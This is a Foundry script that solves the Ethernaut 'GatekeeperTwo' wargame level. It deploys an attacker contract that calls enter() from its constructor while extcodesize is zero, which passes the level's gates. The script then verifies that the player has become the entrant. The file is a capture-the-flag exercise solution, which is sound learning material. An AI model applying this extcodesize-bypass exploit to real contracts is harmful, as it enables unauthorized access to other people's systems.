// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IGatekeeperTwo} from "../src/interfaces/IGatekeeperTwo.sol";
import {GatekeeperTwoAttack} from "../src/attackers/GatekeeperTwoAttack.sol";

contract GatekeeperTwoScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address player = vm.addr(privateKey);

        IGatekeeperTwo target = IGatekeeperTwo(instance);

        address entrantBefore = target.entrant();

        console2.log("--- GatekeeperTwo Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Player Address :", player);
        console2.log("Entrant Before :", entrantBefore);

        if (entrantBefore == player) {
            console2.log("Player is already the entrant! Submit instance in Ethernaut.");
            return;
        }

        vm.startBroadcast(privateKey);

        // Single CREATE transaction: constructor executes enter(gateKey) while extcodesize == 0
        GatekeeperTwoAttack attackerContract = new GatekeeperTwoAttack(instance);
        console2.log("Deployed GatekeeperTwoAttack at:", address(attackerContract));

        vm.stopBroadcast();

        address entrantAfter = target.entrant();
        console2.log("Gate Key Used  :");
        console2.logBytes8(attackerContract.gateKeyUsed());
        console2.log("Entrant After  :", entrantAfter);

        require(entrantAfter == player, "Exploit failed: entrant not set to player");
        console2.log(">>> SUCCESS! Passed all three gates! Submit instance in Ethernaut. <<<");
    }
}
